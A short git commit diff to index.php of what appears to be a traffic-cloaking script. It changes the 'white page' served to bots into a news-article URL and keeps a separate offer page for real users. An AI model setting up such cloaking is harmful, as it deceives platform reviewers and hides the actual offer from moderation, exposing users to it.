46d3837433a9df55bb7fda6967df937f0b04969d
widfat69 <122855886+widfat69@users.noreply.github.com>
2023-01-25 20:50:25 +0700

    Update index.php

--- index.php
+++ index.php
@@ -11,7 +11,7 @@ $fake_allowed_host = $_SERVER['HTTP_HOST'];
 $config['debug'] = false;
 
 /* PHP/HTML file or URL used for bots */
-$config['default_white_page'] = 'white.php';
+$config['default_white_page'] = 'https://www.idntimes.com/tech/trend/izza-namira-1/cara-menambah-followers-instagram-yang-real';
 
 /* PHP/HTML file or URL offer used for real users */
 $config['default_offer_page'] = 'https://inti.revopedia.app/';
